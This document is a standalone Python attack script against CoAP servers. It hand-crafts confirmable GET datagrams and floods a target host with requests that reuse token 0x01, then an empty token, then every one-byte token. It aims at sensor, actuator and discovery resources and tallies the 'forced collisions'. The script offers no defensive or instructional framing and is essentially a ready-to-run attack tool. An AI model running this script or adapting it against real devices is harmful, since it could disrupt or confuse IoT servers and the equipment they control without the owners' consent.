#!/usr/bin/env python3
"""
CoAP Token Collision Attack
"""

import asyncio
import random
import sys
import time

attack_stats = {
    'requests_sent': 0,
    'collisions_forced': 0,
    'responses_received': 0,
    'errors': 0
}

# aiocoap overwrites request.token, so the CON GET is built by hand.
def build_get(mid, token, resource):
    datagram = bytes([0x40 | len(token), 0x01]) + mid.to_bytes(2, 'big') + token
    delta = 11  # Uri-Path; every segment used here is shorter than 13 bytes
    for segment in resource.strip('/').split('/'):
        value = segment.encode()
        datagram += bytes([(delta << 4) | len(value)]) + value
        delta = 0
    return datagram

class CoapEndpoint(asyncio.DatagramProtocol):
    """One UDP socket for every request, so equal tokens collide on the same endpoint."""

    def __init__(self):
        self.transport = None
        self.pending = {}
        self.mid = random.randint(0, 65535)

    def connection_made(self, transport):
        self.transport = transport

    def datagram_received(self, data, addr):
        if len(data) < 4:
            return
        if data[0] & 0x30 == 0x00:  # CON: empty ACK, as aiocoap does
            self.transport.sendto(bytes([0x60, 0x00]) + data[2:4])
        future = self.pending.pop(data[2:4], None)  # tokens collide, so match by MID
        if future is not None:
            future.set_result(data)

    async def request(self, token, resource):
        self.mid = (self.mid + 1) % 65536
        mid = self.mid.to_bytes(2, 'big')
        datagram = build_get(self.mid, token, resource)
        future = asyncio.get_running_loop().create_future()
        self.pending[mid] = future
        timeout = random.uniform(2.0, 3.0)  # CON retransmission with aiocoap's defaults
        for _ in range(5):
            self.transport.sendto(datagram)
            try:
                return await asyncio.wait_for(asyncio.shield(future), timeout)
            except asyncio.TimeoutError:
                timeout *= 2
        del self.pending[mid]
        raise TimeoutError("no response")

class TokenCollisionAttacker:
    def __init__(self, target_host, target_port):
        self.target = (target_host, target_port)
        self.endpoint = None
    
    async def send_request_with_token(self, request_id, resource, token_bytes):
        try:
            print(f"Request {request_id:04d}: Token={token_bytes.hex()} → {resource}")
            
            response = await self.endpoint.request(token_bytes, resource)
            
            attack_stats['requests_sent'] += 1
            attack_stats['responses_received'] += 1
            
            code = f"{response[1] >> 5}.{response[1] & 0x1F:02d}"
            payload = response[4 + (response[0] & 0x0F):].partition(b'\xff')[2]  # log only
            print(f"Response {request_id:04d}: {code} | Payload={payload[:30]}")
            
        except Exception as e:
            attack_stats['errors'] += 1
            print(f"Error request {request_id}: {e}")
    
    async def token_collision_attack(self, collision_token, num_requests, resources):
        
        print(f"\nForcing {num_requests} requests with Token={collision_token.hex()}")
        print(f"The server will need to correlate {num_requests} responses to the same token!\n")
        
        tasks = []
        for i in range(num_requests):
            resource = resources[i % len(resources)]
            task = self.send_request_with_token(i, resource, collision_token)
            tasks.append(task)
            await asyncio.sleep(0.01)  # Small delay
        
        await asyncio.gather(*tasks, return_exceptions=True)
        
        attack_stats['collisions_forced'] += 1
    
    async def exhaustive_token_space_attack(self, resources):
        
        print("\nTesting the full 1-byte token space (0x00-0xFF)...\n")
        
        tasks = []
        for token_value in range(256):
            token_bytes = bytes([token_value])
            resource = resources[token_value % len(resources)]
            task = self.send_request_with_token(token_value, resource, token_bytes)
            tasks.append(task)
            
            if len(tasks) >= 50:  # Batches of 50
                await asyncio.gather(*tasks, return_exceptions=True)
                tasks.clear()
                await asyncio.sleep(0.5)
        
        if tasks:
            await asyncio.gather(*tasks, return_exceptions=True)
    
    async def launch_attack(self):
        """Launch the full token collision attack."""
        
        loop = asyncio.get_running_loop()
        _, self.endpoint = await loop.create_datagram_endpoint(CoapEndpoint, remote_addr=self.target)
        
        resources = [
            "/sensor/temp",
            "/sensor/humidity",
            "/actuator/led",
            "/status",
            "/.well-known/core",
        ]
        
        print("\nStarting CoAP Token Collision Attack...\n")
        
        # Phase 1: Massive collision with token 0x01
        collision_token = b'\x01'
        await self.token_collision_attack(collision_token, 100, resources)
        await asyncio.sleep(2)
        
        # Phase 2: Collision with empty token (0 bytes)
        print("\nPhase 2: Empty token (0 bytes)")
        collision_token = b''
        await self.token_collision_attack(collision_token, 50, resources)
        
        await asyncio.sleep(2)
        
        # Phase 3: Full token-space sweep
        print("\nPhase 3: Full sweep (0x00-0xFF)")
        await self.exhaustive_token_space_attack(resources)
        print(f"Requests sent: {attack_stats['requests_sent']}")
        print(f"Forced collisions: {attack_stats['collisions_forced']}")
        print(f"Responses received: {attack_stats['responses_received']}")
        print(f"Errors: {attack_stats['errors']}")

async def main():
    if len(sys.argv) < 3:
        sys.exit(1)
    
    target_host = sys.argv[1]
    target_port = int(sys.argv[2])
    
    print(f"Target: {target_host}:{target_port}")
    print(f"Timestamp: {time.strftime('%Y-%m-%d %H:%M:%S')}")
    
    attacker = TokenCollisionAttacker(target_host, target_port)
    await attacker.launch_attack()

if __name__ == "__main__":
    asyncio.run(main())
